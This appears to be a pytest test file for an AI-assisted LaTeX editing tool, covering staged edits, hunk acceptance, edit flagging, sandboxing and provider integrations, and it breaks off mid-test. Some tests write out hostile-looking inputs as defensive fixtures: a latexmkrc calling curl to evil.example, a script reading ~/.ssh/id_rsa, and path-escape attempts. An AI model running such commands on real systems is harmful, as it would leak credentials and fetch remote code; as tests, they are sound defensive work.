"""The agent: staging, hunks, every kind of provider. Models are fake (shell scripts and a local HTTP server), so
these cost nothing; test_agent_live.py runs against real ones when asked."""

from __future__ import annotations

import json
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from .conftest import write_executable
from thor import codex_cli, projects
from thor.agent import anthropic_api, codex, providers, textmode
from thor.agent.base import AgentError, Turn
from thor.agent.staging import Staging, StagingConflict, apply_hunk, compute_hunks, hunk_flags
from thor.agent.tools import FILE_TOOLS, ToolBox, ToolError, check_args
from thor.first_run import FirstRun
from thor.history import History
from thor.server import create_app
from thor.settings import Command, Endpoint, MemorySecret, Settings, SettingsError, SettingsStore
from thor.setup_tex import TexInstaller
from thor.store import Store

TOKEN = "s3cret"
BASE = "http://127.0.0.1:8123"
TEXT = "".join(f"Line {i} of the paper.\n" for i in range(1, 31))


@pytest.fixture(autouse=True)
def basic_tools(bin_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The fake programs here are shell scripts that use cat and sleep."""
    monkeypatch.setenv("THOR_TOOL_PATH", f"{bin_dir}:/usr/bin:/bin")


def project(tmp_path: Path) -> tuple[Path, projects.ProjectConfig]:
    root = tmp_path / "paper"
    (root / "tex" / "figs").mkdir(parents=True)
    (root / "tex" / "main.tex").write_text(TEXT)
    (root / "tex" / "refs.bib").write_text("@article{a, title={A}}\n")
    (root / "tex" / "figs" / "one.png").write_bytes(b"\x89PNG\0data")
    cfg = projects.ProjectConfig(name="Paper", latex_dir="tex", main="main.tex", engine="pdflatex")
    return root, cfg


@pytest.fixture
def staged(tmp_path: Path) -> Staging:
    root, cfg = project(tmp_path)
    staging = Staging(tmp_path / "chat", root, cfg)
    staging.create()
    return staging


def edit(staging: Staging, old: str, new: str, name: str = "main.tex") -> None:
    path = staging.work / name
    path.write_text(path.read_text().replace(old, new))


def real(staging: Staging) -> str:
    return (staging.latex_dir / "main.tex").read_text()


# Hunks


def test_hunks_find_each_change_apart() -> None:
    new = TEXT.replace("Line 5 of", "Line five of").replace("Line 20 of the paper.\n", "")
    hunks = compute_hunks("main.tex", TEXT, new)
    assert [(h.old_start, h.new_start, len(h.old), len(h.new)) for h in hunks] == [(5, 5, 1, 1), (20, 20, 1, 0)]
    assert hunks[0].before == ["Line 2 of the paper.\n", "Line 3 of the paper.\n", "Line 4 of the paper.\n"]
    assert len({h.id for h in hunks}) == 2


def test_a_hunk_finds_its_place_after_text_above_it_moved() -> None:
    hunk = compute_hunks("main.tex", TEXT, TEXT.replace("Line 20 of", "Line twenty of"))[0]
    moved = "A new first line.\nAnd a second.\n" + TEXT
    assert "Line twenty of" in apply_hunk(moved, hunk)
    assert apply_hunk(TEXT.replace("Line 20 of the paper.\n", ""), hunk) is None


# Staging


def test_the_copy_leaves_out_what_latex_writes_and_hidden_files(tmp_path: Path) -> None:
    root, cfg = project(tmp_path)
    (root / "tex" / "main.aux").write_text("generated")
    (root / "tex" / ".git").mkdir()
    (root / "tex" / ".git" / "config").write_text("x")
    (root / "tex" / "revision1").mkdir()
    (root / "tex" / "revision1" / "main.tex").write_text("old")
    staging = Staging(tmp_path / "chat", root, cfg)
    staging.create()
    assert (staging.work / "main.tex").is_file() and (staging.work / "figs" / "one.png").is_file()
    assert not (staging.work / "main.aux").exists() and not (staging.work / ".git").exists()
    assert not (staging.work / "revision1").exists()


def test_nothing_reaches_the_project_until_accepted(staged: Staging) -> None:
    edit(staged, "Line 5 of", "Line five of")
    assert real(staged) == TEXT
    change = staged.changes()[0]
    assert change.path == "tex/main.tex" and change.kind == "edit" and (change.additions, change.deletions) == (1, 1)
    staged.accept("tex/main.tex", change.hunks[0].id)
    assert "Line five of" in real(staged) and staged.changes() == []


def test_hunks_are_accepted_and_rejected_one_by_one(staged: Staging) -> None:
    edit(staged, "Line 5 of", "Line five of")
    edit(staged, "Line 20 of", "Line twenty of")
    first, second = staged.changes()[0].hunks
    staged.accept("tex/main.tex", second.id)
    assert "Line twenty of" in real(staged) and "Line five of" not in real(staged)
    remaining = staged.changes()[0].hunks
    assert [h.id for h in remaining] == [first.id]
    notes = staged.reject("tex/main.tex", first.id)
    assert "Line five of" in notes[0] and staged.changes() == []
    assert "Line five of" not in (staged.work / "main.tex").read_text()
    assert "Line twenty of" in (staged.work / "main.tex").read_text()


def test_accepting_a_whole_file_keeps_every_hunk_right(staged: Staging) -> None:
    edit(staged, "Line 5 of the paper.\n", "One.\nTwo.\nThree.\n")
    edit(staged, "Line 20 of", "Line twenty of")
    edit(staged, "Line 25 of the paper.\n", "")
    staged.accept("tex/main.tex")
    assert real(staged) == (staged.work / "main.tex").read_text() and staged.changes() == []


def test_a_user_edit_above_a_hunk_does_not_stop_it(staged: Staging) -> None:
    edit(staged, "Line 20 of", "Line twenty of")
    hunk = staged.changes()[0].hunks[0]
    (staged.latex_dir / "main.tex").write_text("Written by the user.\n" + TEXT)
    staged.accept("tex/main.tex", hunk.id)
    assert real(staged).startswith("Written by the user.\n") and "Line twenty of" in real(staged)


def test_a_user_edit_of_the_same_line_stops_it(staged: Staging) -> None:
    edit(staged, "Line 20 of", "Line twenty of")
    hunk = staged.changes()[0].hunks[0]
    (staged.latex_dir / "main.tex").write_text(TEXT.replace("Line 20 of", "Line XX of"))
    with pytest.raises(StagingConflict, match="changed since"):
        staged.accept("tex/main.tex", hunk.id)
    assert "Line XX of" in real(staged)


def test_sync_carries_user_edits_under_waiting_ones(staged: Staging) -> None:
    edit(staged, "Line 20 of", "Line twenty of")
    (staged.latex_dir / "main.tex").write_text("Written by the user.\n" + TEXT)
    (staged.latex_dir / "notes.tex").write_text("A new file.\n")
    assert staged.sync() == []
    assert (staged.work / "main.tex").read_text().startswith("Written by the user.\n")
    assert "Line twenty of" in (staged.work / "main.tex").read_text()
    assert (staged.work / "notes.tex").is_file()
    assert len(staged.changes()) == 1 and len(staged.changes()[0].hunks) == 1


def test_sync_drops_a_waiting_edit_whose_text_is_gone(staged: Staging) -> None:
    edit(staged, "Line 20 of", "Line twenty of")
    (staged.latex_dir / "main.tex").write_text(TEXT.replace("Line 20 of", "Line XX of"))
    dropped = staged.sync()
    assert dropped == ["tex/main.tex, line 20"]
    assert staged.changes() == [] and "Line XX of" in (staged.work / "main.tex").read_text()


def test_new_deleted_and_binary_files(staged: Staging) -> None:
    (staged.work / "new.tex").write_text("New text.\n")
    (staged.work / "refs.bib").unlink()
    (staged.work / "figs" / "one.png").write_bytes(b"\x89PNG\0other")
    kinds = {c.path: c.kind for c in staged.changes()}
    assert kinds == {"tex/new.tex": "new", "tex/refs.bib": "deleted", "tex/figs/one.png": "binary"}
    for path in kinds:
        staged.accept(path)
    assert (staged.latex_dir / "new.tex").read_text() == "New text.\n"
    assert not (staged.latex_dir / "refs.bib").exists()
    assert (staged.latex_dir / "figs" / "one.png").read_bytes() == b"\x89PNG\0other"
    assert staged.changes() == []


def test_what_latex_leaves_is_not_an_edit(staged: Staging) -> None:
    (staged.work / "main.aux").write_text("x")
    (staged.work / "main.log").write_text("x")
    (staged.work / ".thor-build").mkdir()
    (staged.work / ".thor-build" / "main.pdf").write_text("x")
    assert staged.changes() == []


def test_latexmkrc_edits_are_refused_and_put_back(staged: Staging) -> None:
    (staged.work / "latexmkrc").write_text("system('curl evil.example');\n")
    change = staged.changes()[0]
    assert "code" in change.refused
    with pytest.raises(StagingConflict, match="code"):
        staged.accept("tex/latexmkrc")
    assert not (staged.latex_dir / "latexmkrc").exists()
    staged.restore_rc()
    assert not (staged.work / "latexmkrc").exists()


# Flags


def test_the_real_edit_a_model_got_wrong_is_flagged() -> None:
    old = "The flash data come from a space based sensor, and it's coverage is global between 38 degrees of latitude.\n"
    new = "The flash data come from a space-based sensor whose coverage extends globally between 38 degrees south and 38 degrees north latitude.\n"
    flags = hunk_flags(old, new)
    assert any("38" in f for f in flags) and any("south" in f and "north" in f for f in flags)


def test_a_spelling_fix_is_not_flagged() -> None:
    assert hunk_flags("Lightning is a usefull marker, as Section~\\ref{a} shows.\n", "Lightning is a useful marker, as Section~\\ref{a} shows.\n") == []


@pytest.mark.parametrize("old,new,word", [
    ("Rain increases.\n", "Rain decreases.\n", "decreases"),
    ("This is significant.\n", "This is not significant.\n", "not"),
    ("See \\citet{a}.\n", "See \\citet{b}.\n", "citation"),
    ("See Fig.~\\ref{f:one}.\n", "See Fig.~\\ref{f:two}.\n", "reference"),
    ("A trend of 3.4 percent.\n", "A trend of 3.5 percent.\n", "3.5"),
])
def test_edits_that_can_change_a_finding_are_flagged(old: str, new: str, word: str) -> None:
    assert word in " ".join(hunk_flags(old, new))


def test_accept_all_leaves_flagged_hunks_waiting(staged: Staging) -> None:
    edit(staged, "Line 5 of", "Line 500 of")
    edit(staged, "the paper.\nLine 21 of", "the paper!\nLine 21 of")
    staged.accept("tex/main.tex", skip_flagged=True)
    assert "the paper!" in real(staged) and "Line 500" not in real(staged)
    left = staged.changes()[0].hunks
    assert len(left) == 1 and "500" in left[0].flags[0]
    # Asked for by name, it goes in.
    staged.accept("tex/main.tex", left[0].id)
    assert "Line 500" in real(staged) and staged.changes() == []


def test_accept_all_leaves_a_deleted_file(staged: Staging) -> None:
    (staged.work / "refs.bib").unlink()
    staged.accept("tex/refs.bib", skip_flagged=True)
    assert (staged.latex_dir / "refs.bib").is_file() and staged.changes()[0].kind == "deleted"


# The sandbox for commands the user adds


def test_a_sandboxed_command_cannot_write_or_read_outside(tmp_path: Path, bin_dir: Path) -> None:
    from thor.agent import command as command_backend
    outside = tmp_path / "paper-real.tex"
    outside.write_text("The real paper.\n")
    write_executable(bin_dir / "nosy", f"""#!/bin/sh
cat > /dev/null
echo overwritten > {outside} 2>/dev/null && echo WROTE-OUTSIDE || echo blocked-write
echo ok > inside.tex && echo wrote-inside
""")
    turn, events = make_turn(tmp_path)
    command_backend.run(turn, Command("n", "Nosy", "nosy", edits_files=True))
    text = "".join(e.get("text", "") for e in events)
    assert "blocked-write" in text and "wrote-inside" in text and "WROTE-OUTSIDE" not in text
    assert outside.read_text() == "The real paper.\n" and (turn.cwd / "inside.tex").is_file()


def test_the_sandbox_keeps_private_files_private(tmp_path: Path) -> None:
    from thor.agent import sandbox
    home = tmp_path / "home"
    (home / ".ssh").mkdir(parents=True)
    (home / ".ssh" / "id_rsa").write_text("private key")
    (home / ".mytool").mkdir()
    root = tmp_path / "copy"
    root.mkdir()
    script = (f"cat {home}/.ssh/id_rsa >/dev/null 2>&1 && echo READ-KEY || echo blocked-read; "
              f"echo x > {home}/.mytool/state 2>/dev/null && echo own-settings-ok || echo OWN-SETTINGS-BLOCKED")
    done = subprocess.run([sandbox.SANDBOX_EXEC, "-p", sandbox.profile(root, "/usr/local/bin/mytool", home), "/bin/sh", "-c", script],
                          capture_output=True, text=True)
    assert "blocked-read" in done.stdout and "own-settings-ok" in done.stdout


def test_a_path_cannot_break_out_of_the_sandbox_profile(tmp_path: Path) -> None:
    from thor.agent import sandbox
    odd = tmp_path / 'odd"name'
    odd.mkdir()
    assert '\\"' in sandbox.profile(odd, "x") and subprocess.run([sandbox.SANDBOX_EXEC, "-p", sandbox.profile(odd, "x"), "/usr/bin/true"]).returncode == 0


# Comments for models without Thor's tools


def test_codex_is_told_where_the_comments_are(client: TestClient, opened: str, bin_dir: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    root = Path(client.get(f"/api/projects/{opened}").json()["root"])
    folder = root / "revision2" / "supporting_files" / "comments" / "ana"
    folder.mkdir(parents=True)
    (folder / "comments.txt").write_text("1. Page 3: this number looks wrong.\n")
    prompt_file = tmp_path / "codex-prompt.txt"
    path = fake_codex(bin_dir, f"""cat > {prompt_file}
ls .thor-comments >> {prompt_file}
cat .thor-comments/comments.txt >> {prompt_file}
echo '{{"type":"item.completed","item":{{"id":"1","type":"agent_message","text":"Read them."}}}}'
""")
    got = client.get("/api/settings").json()
    client.put("/api/settings", json={"agent": {**got["agent"], "provider": "codex", "codex_path": str(path), "codex_model": "m"}})
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    client.post(f"{base}/{chat}/messages", json={"text": "Go through the comments."})
    finish(client, opened, chat)
    prompt = prompt_file.read_text()
    assert ".thor-comments/comments.txt" in prompt and "this number looks wrong" in prompt
    assert client.get(f"{base}/{chat}/changes").json()["files"] == []  # never an edit


def test_a_model_without_tools_is_sent_the_comments_when_asked_about_them(tmp_path: Path) -> None:
    turn, _ = make_turn(tmp_path, comments="1. Page 3: wrong number.", prompt="Answer the comments.")
    assert "wrong number" in textmode.full_prompt(turn)


# Passages from the editor


def test_several_passages_reach_the_model_with_where_they_came_from() -> None:
    from thor.agent.runs import describe_context
    said = describe_context({"file": "tex/main.tex", "line": 3, "selection": {"from": 3, "to": 3, "text": "Line 3."},
                             "selections": [{"file": "tex/main.tex", "from": 3, "to": 3, "text": "Line 3."},
                                            {"file": "tex/part.tex", "from": 7, "to": 9, "text": "Part text."}]})
    assert "passage from tex/main.tex, lines 3-3" in said and "passage from tex/part.tex, lines 7-9" in said and "Part text." in said
    # The current selection is one of them, so it is not said twice.
    assert said.count("Line 3.") == 1


def test_a_passages_file_is_shown_to_a_model_without_tools(client: TestClient, opened: str, bin_dir: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    root = Path(client.get(f"/api/projects/{opened}").json()["root"])
    (root / "tex" / "part.tex").write_text("The text of the other file.\n")
    prompt_file = tmp_path / "prompt.txt"
    monkeypatch.setenv("THOR_TEST_PROMPT", str(prompt_file))
    write_executable(bin_dir / "mymodel", '#!/bin/sh\ncat > "$THOR_TEST_PROMPT"\necho Done.\n')
    use_command(client, "mymodel")
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    context = {"selections": [{"file": "tex/part.tex", "from": 1, "to": 1, "text": "The text"}]}
    client.post(f"{base}/{chat}/messages", json={"text": "Look.", "context": context})
    finish(client, opened, chat)
    prompt = prompt_file.read_text()
    assert "--- part.tex" in prompt and "The text of the other file." in prompt and "passage from tex/part.tex" in prompt


# Local models


def test_fast_turns_off_thinking(tmp_path: Path, model: FakeModel) -> None:
    from thor.agent import openai_api
    model.replies = [chat_text("Done.")]
    turn, _ = make_turn(tmp_path, model="tiny", fast=True)
    openai_api.run(turn, model.url, None, "Local", no_thinking=turn.fast)
    assert model.requests[0]["reasoning_effort"] == "none"


def test_ollama_is_asked_to_keep_the_model_loaded(tmp_path: Path, model: FakeModel) -> None:
    from thor.agent import openai_api
    model.replies = [chat_text("ok")]
    turn, events = make_turn(tmp_path, model="tiny")
    openai_api.keep_loaded(f"{model.url}/v1", "tiny", turn)
    assert model.requests[0] == {"model": "tiny", "keep_alive": "30m"}
    assert events[0]["summary"] == "Loading tiny"


def test_a_failure_to_keep_loaded_does_not_stop_the_turn(tmp_path: Path) -> None:
    from thor.agent import openai_api
    turn, _ = make_turn(tmp_path, model="tiny")
    openai_api.keep_loaded("http://127.0.0.1:9/v1", "tiny", turn)


# Codex remembers


def test_a_working_codex_model_is_remembered_for_new_chats(client: TestClient, opened: str, bin_dir: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CODEX_HOME", str(tmp_path))
    (tmp_path / "models_cache.json").write_text(json.dumps({"models": [{"slug": "good", "display_name": "Good", "visibility": "list"}]}))
    path = fake_codex(bin_dir, """cat > /dev/null
case "$*" in
  *"-m good"*) echo '{"type":"item.completed","item":{"id":"1","type":"agent_message","text":"Done."}}';;
  *) echo '{"type":"error","message":"The model is not supported."}'; exit 1;;
esac
""")
    got = client.get("/api/settings").json()
    client.put("/api/settings", json={"agent": {**got["agent"], "provider": "codex", "codex_path": str(path)}})
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    client.post(f"{base}/{chat}/messages", json={"text": "Go."})
    finish(client, opened, chat)
    assert client.get("/api/settings").json()["agent"]["codex_model"] == "good"


def test_accept_all_through_the_api_says_what_it_left(client: TestClient, opened: str, bin_dir: Path, tmp_path: Path) -> None:
    write_executable(bin_dir / "mymodel", """#!/bin/sh
cat > /dev/null
printf '<<<<<<< SEARCH main.tex\\nLine 5 of the paper.\\n=======\\nLine 500 of the paper.\\n>>>>>>> REPLACE\\n'
printf '<<<<<<< SEARCH main.tex\\nLine 20 of the paper.\\n=======\\nLine 20 of a paper.\\n>>>>>>> REPLACE\\nDone.\\n'
""")
    use_command(client, "mymodel")
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    client.post(f"{base}/{chat}/messages", json={"text": "Go."})
    finish(client, opened, chat)
    after = client.post(f"{base}/{chat}/changes/accept", json={}).json()
    root = Path(client.get(f"/api/projects/{opened}").json()["root"])
    text = (root / "tex" / "main.tex").read_text()
    assert after["written"] == ["tex/main.tex"] and "Line 20 of a paper." in text and "Line 500" not in text
    assert "500" in after["files"][0]["hunks"][0]["flags"][0]


# Tools


def box(staged: Staging) -> ToolBox:
    return ToolBox(staged.work, [])


def test_tools_stay_inside_the_copy(staged: Staging, tmp_path: Path) -> None:
    tools = box(staged)
    (tmp_path / "secret.txt").write_text("private")
    for path in ("../../secret.txt", str(tmp_path / "secret.txt"), "/etc/hosts"):
        with pytest.raises(ToolError, match="outside"):
            tools.call("read_file", {"path": path})
    with pytest.raises(ToolError, match="outside"):
        tools.call("write_file", {"path": "../escape.tex", "content": "x"})
    with pytest.raises(ToolError, match="code"):
        tools.call("write_file", {"path": "latexmkrc", "content": "x"})
    with pytest.raises(ToolError, match="Hidden"):
        tools.call("write_file", {"path": ".git/config", "content": "x"})


def test_tools_can_read_the_results_folder_but_not_write_it(staged: Staging, tmp_path: Path) -> None:
    results = tmp_path / "results"
    results.mkdir()
    (results / "table.csv").write_text("a,b\n")
    tools = ToolBox(staged.work, [results])
    assert "a,b" in tools.call("read_file", {"path": str(results / "table.csv")})
    with pytest.raises(ToolError, match="outside"):
        tools.call("write_file", {"path": str(results / "table.csv"), "content": "x"})


def test_edit_tool_wants_a_unique_match(staged: Staging) -> None:
    tools = box(staged)
    with pytest.raises(ToolError, match="30 times"):
        tools.call("edit_file", {"path": "main.tex", "old_text": "of the paper", "new_text": "x"})
    with pytest.raises(ToolError, match="not in"):
        tools.call("edit_file", {"path": "main.tex", "old_text": "absent", "new_text": "x"})
    assert not tools.wrote
    tools.call("edit_file", {"path": "main.tex", "old_text": "Line 7 of", "new_text": "Line seven of"})
    assert tools.wrote and "Line seven of" in (staged.work / "main.tex").read_text()


def test_read_and_search_tools(staged: Staging) -> None:
    tools = box(staged)
    shown = tools.call("read_file", {"path": "main.tex", "start_line": 3, "line_count": 2})
    assert shown.startswith("3\tLine 3 of") and "4\tLine 4" in shown and "continue from line 5" in shown
    assert tools.call("search", {"pattern": r"Line 1\d "}).count("main.tex:") == 10
    assert tools.call("search", {"pattern": "title", "glob": "*.bib"}).startswith("refs.bib:1:")
    with pytest.raises(ToolError, match="regular expression"):
        tools.call("search", {"pattern": "("})
    assert "main.tex" in tools.call("list_files", {"path": "."})


def test_arguments_are_checked_against_the_schema() -> None:
    edit_schema = next(t for t in FILE_TOOLS if t["name"] == "edit_file")["parameters"]
    assert check_args(edit_schema, {"path": "a", "old_text": "b"}) == "The argument new_text is missing."
    assert "string" in check_args(edit_schema, {"path": 1, "old_text": "b", "new_text": "c"})
    assert "no argument" in check_args(edit_schema, {"path": "a", "old_text": "b", "new_text": "c", "x": 1})
    assert check_args(edit_schema, {"path": "a", "old_text": "b", "new_text": "c"}) is None
    assert check_args(edit_schema, "not an object")


# Edit blocks


def test_blocks_are_taken_out_of_the_text_and_applied(staged: Staging) -> None:
    filter_ = textmode.BlockFilter()
    answer = ("I changed one line.\n<<<<<<< SEARCH main.tex\nLine 5 of the paper.\n=======\nLine five.\n>>>>>>> REPLACE\n"
              "<<<<<<< SEARCH new.tex\n=======\nBrand new.\n>>>>>>> REPLACE\nDone.\n")
    shown = "".join(filter_.feed(line) for line in answer.splitlines(keepends=True))
    assert shown == "I changed one line.\nDone.\n"
    done, failed = textmode.apply_edits(filter_.edits, staged.work)
    assert done == ["main.tex", "new.tex"] and failed == []
    assert "Line five.\n" in (staged.work / "main.tex").read_text()
    assert (staged.work / "new.tex").read_text() == "Brand new.\n"


def test_blocks_that_do_not_fit_are_reported(staged: Staging) -> None:
    edits = [textmode.Edit("main.tex", "Absent line.\n", "x\n"), textmode.Edit("main.tex", "of the paper", "x"),
             textmode.Edit("../outside.tex", "", "x\n"), textmode.Edit("latexmkrc", "", "x\n"), textmode.Edit("gone.tex", "a\n", "b\n")]
    done, failed = textmode.apply_edits(edits, staged.work)
    assert done == [] and len(failed) == 5 and not (staged.work / "latexmkrc").exists()


# Settings


def test_old_settings_become_providers() -> None:
    assert Settings.from_dict({"agent": {"auth": "api_key"}}).agent.provider == "anthropic_api"
    assert Settings.from_dict({"agent": {"auth": "claude_plan"}}).agent.provider == "claude_code"


def test_keys_do_not_travel_unencrypted_to_other_machines() -> None:
    agent = Settings().agent
    agent.endpoints = [Endpoint("far", "Far", "http://example.org/v1", "m")]
    with pytest.raises(SettingsError, match="not encrypted"):
        agent.validate()
    agent.endpoints = [Endpoint("near", "Near", "http://127.0.0.1:11434/v1", "m"), Endpoint("far", "Far", "https://example.org/v1", "m")]
    agent.validate()


def test_catalog_says_who_is_ready(bin_dir: Path) -> None:
    agent = Settings().agent
    agent.endpoints = [Endpoint("local", "Local", "http://127.0.0.1:1/v1", "tiny"), Endpoint("nomodel", "No model", "http://127.0.0.1:1/v1")]
    agent.commands = [Command("mine", "Mine", "mine --go")]
    agent.claude_path = str(bin_dir / "absent")
    agent.codex_path = str(bin_dir / "absent")
    found = {p["id"]: p for p in providers.catalog(agent, MemorySecret("sk-ant-x"))}
    assert not found["claude_code"]["ready"] and not found["codex"]["ready"] and "not found" in found["codex"]["detail"]
    assert found["anthropic_api"]["ready"] and not found["openai_api"]["ready"]
    assert found["endpoint:local"]["ready"] and not found["endpoint:nomodel"]["ready"] and found["command:mine"]["ready"]


# A turn, for the providers that run here


def make_turn(tmp_path: Path, **kw) -> tuple[Turn, list[dict]]:
    root, cfg = project(tmp_path)
    staging = Staging(tmp_path / "chat", root, cfg)
    staging.create()
    events: list[dict] = []
    defaults = dict(prompt="Do it.", instructions="Be good.", cwd=staging.work, box=ToolBox(staging.work, []), model="m",
                    effort="high", budget_usd=5.0, emit=events.append, cancelled=threading.Event(), ask=lambda s, d: True,
                    open_files=[staging.work / "main.tex"])
    return Turn(**{**defaults, **kw}), events


def fake_codex(bin_dir: Path, body: str) -> Path:
    return write_executable(bin_dir / "codex", f"""#!/bin/sh
if [ "$1" = "--version" ]; then echo "codex-cli 9.9.9"; exit 0; fi
if [ "$1" = "login" ]; then echo "Logged in using ChatGPT"; exit 0; fi
{body}
""")


def test_codex_status(bin_dir: Path) -> None:
    fake_codex(bin_dir, "")
    st = codex_cli.status()
    assert (st.logged_in, st.version, st.detail) == (True, "9.9.9", "Logged in using ChatGPT")


def test_codex_not_signed_in(bin_dir: Path) -> None:
    write_executable(bin_dir / "codex", '#!/bin/sh\nif [ "$1" = "--version" ]; then echo "codex-cli 1"; exit 0; fi\nexit 1\n')
    assert codex_cli.status().logged_in is False


def test_codex_command_line(tmp_path: Path) -> None:
    turn, _ = make_turn(tmp_path, model="some-model", effort="xhigh")
    args, stdin_text = codex.command_line("/bin/codex", turn)
    assert args[:3] == ["/bin/codex", "exec", "--json"] and args[-1] == "-" and "resume" not in args
    assert args[args.index("--sandbox") + 1] == "workspace-write"
    assert "model_reasoning_effort=xhigh" in args and args[args.index("-m") + 1] == "some-model"
    assert stdin_text.startswith("Be good.") and stdin_text.endswith("Do it.")
    turn.session = "thread-1"
    args, stdin_text = codex.command_line("/bin/codex", turn)
    # The sandbox and the JSON stream hold for a resumed thread, too.
    assert args.index("--sandbox") < args.index("resume") and args[args.index("resume") + 1] == "thread-1"
    assert args[-1] == "Do it." and stdin_text is None


def test_codex_events_become_a_transcript(tmp_path: Path, bin_dir: Path) -> None:
    lines = [
        {"type": "thread.started", "thread_id": "thread-9"},
        {"type": "turn.started"},
        {"type": "item.started", "item": {"id": "1", "type": "command_execution", "command": "latexmk -pdf main.tex", "status": "in_progress"}},
        {"type": "item.completed", "item": {"id": "1", "type": "command_execution", "command": "latexmk", "exit_code": 2}},
        {"type": "item.completed", "item": {"id": "2", "type": "file_change", "changes": [{"path": "a/main.tex", "kind": "update"}]}},
        {"type": "item.completed", "item": {"id": "3", "type": "something_new", "whatever": 1}},
        {"type": "future.event"},
        {"type": "item.completed", "item": {"id": "4", "type": "agent_message", "text": "Fixed it."}},
        {"type": "turn.completed", "usage": {"input_tokens": 100, "cached_input_tokens": 90, "output_tokens": 7, "reasoning_output_tokens": 0}},
    ]
    body = "cat > /dev/null\n" + "".join(f"cat <<'END'\n{json.dumps(line)}\nEND\n" for line in lines) + "echo not json\n"
    path = fake_codex(bin_dir, body)
    turn, events = make_turn(tmp_path)
    codex.run(turn, str(path))
    assert turn.session == "thread-9" and turn.box.wrote
    kinds = [(e["type"], e.get("summary") or e.get("text") or e.get("ok")) for e in events]
    assert ("activity", "Running latexmk -pdf main.tex") in kinds and ("activity_done", False) in kinds
    assert ("activity", "Edited main.tex") in kinds and ("text", "Fixed it.\n") in kinds
    assert events[-1] == {"type": "usage", "input_tokens": 100, "output_tokens": 7, "cost_usd": None}


def test_codex_failures_are_told_in_words(tmp_path: Path, bin_dir: Path) -> None:
    failing = 'cat > /dev/null\necho \'{"type":"turn.failed","error":{"message":"Usage limit reached"}}\'\nexit 1\n'
    path = fake_codex(bin_dir, failing)
    turn, _ = make_turn(tmp_path)
    with pytest.raises(AgentError, match="Usage limit reached"):
        codex.run(turn, str(path))
    (tmp_path / "again").mkdir()
    path = fake_codex(bin_dir, "cat > /dev/null\necho 'error: not logged in' >&2\nexit 1\n")
    turn2, _ = make_turn(tmp_path / "again")
    with pytest.raises(AgentError, match="codex login"):
        codex.run(turn2, str(path))


def test_codex_lists_the_models_this_account_has(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CODEX_HOME", str(tmp_path))
    assert codex_cli.models() == []
    (tmp_path / "models_cache.json").write_text(json.dumps({"models": [
        {"slug": "b", "display_name": "B", "visibility": "list", "priority": 9},
        {"slug": "hidden", "display_name": "H", "visibility": "hide", "priority": 1},
        {"slug": "a", "display_name": "A", "visibility": "list", "priority": 5},
    ]}))
    assert codex_cli.models() == [{"id": "a", "name": "A"}, {"id": "b", "name": "B"}]


def test_a_model_the_account_lacks_is_replaced_and_said_so(tmp_path: Path, bin_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CODEX_HOME", str(tmp_path))
    (tmp_path / "models_cache.json").write_text(json.dumps({"models": [{"slug": "good", "display_name": "Good", "visibility": "list"}]}))
    error = json.dumps({"type": "error", "message": json.dumps({"type": "error", "status": 400, "error": {
        "type": "invalid_request_error", "message": "The 'old' model is not supported when using Codex with a ChatGPT account.",
        "code": "model_not_found"}})})
    path = fake_codex(bin_dir, f"""cat > /dev/null
case "$*" in
  *"-m good"*) echo '{{"type":"item.completed","item":{{"id":"1","type":"agent_message","text":"Done."}}}}';;
  *) cat <<'END'
{error}
END
  exit 1;;
esac
""")
    (tmp_path / "t").mkdir()
    turn, events = make_turn(tmp_path / "t", model="")
    codex.run(turn, str(path))
    assert turn.model == "good"
    assert any(e["type"] == "notice" and "Good" in e["text"] for e in events) and {"type": "text", "text": "Done.\n"} in events


def test_changing_the_model_keeps_the_conversation(tmp_path: Path, bin_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CODEX_HOME", str(tmp_path))
    (tmp_path / "models_cache.json").write_text(json.dumps({"models": [{"slug": "good", "visibility": "list"}]}))
    log = tmp_path / "args.txt"
    path = fake_codex(bin_dir, f"""echo "$*" >> {log}
case "$*" in
  *"-m good"*) echo '{{"type":"item.completed","item":{{"id":"1","type":"agent_message","text":"Done."}}}}';;
  *) echo '{{"type":"thread.started","thread_id":"failed-thread"}}'; echo '{{"type":"error","message":"The model is not supported."}}'; exit 1;;
esac
""")
    (tmp_path / "t").mkdir()
    turn, _ = make_turn(tmp_path / "t", model="", session="thread-with-history")
    codex.run(turn, str(path))
    assert turn.session == "thread-with-history" and "-m good" in log.read_text() and "resume thread-with-history" in log.read_text().splitlines()[-1]


def test_a_model_the_user_chose_is_not_replaced(tmp_path: Path, bin_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CODEX_HOME", str(tmp_path))
    (tmp_path / "models_cache.json").write_text(json.dumps({"models": [{"slug": "good", "visibility": "list"}]}))
    path = fake_codex(bin_dir, """cat > /dev/null
echo '{"type":"error","message":"The model is not supported."}'
exit 1
""")
    (tmp_path / "t").mkdir()
    turn, _ = make_turn(tmp_path / "t", model="mine")
    with pytest.raises(AgentError, match="not supported"):
        codex.run(turn, str(path))
    assert turn.model == "mine"


def test_nested_server_errors_become_their_message() -> None:
    raw = json.dumps({"type": "error", "status": 400, "error": {"type": "x", "message": "The real words."}})
    assert codex.plain_error(raw) == "The real words."
    assert codex.plain_error("Plain text.") == "Plain text."


def test_codex_is_not_given_an_api_key_from_the_shell(tmp_path: Path, bin_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OPENAI_API_KEY", "from-the-shell")
    monkeypatch.setenv("CODEX_API_KEY", "from-the-shell")
    path = fake_codex(bin_dir, """cat > /dev/null
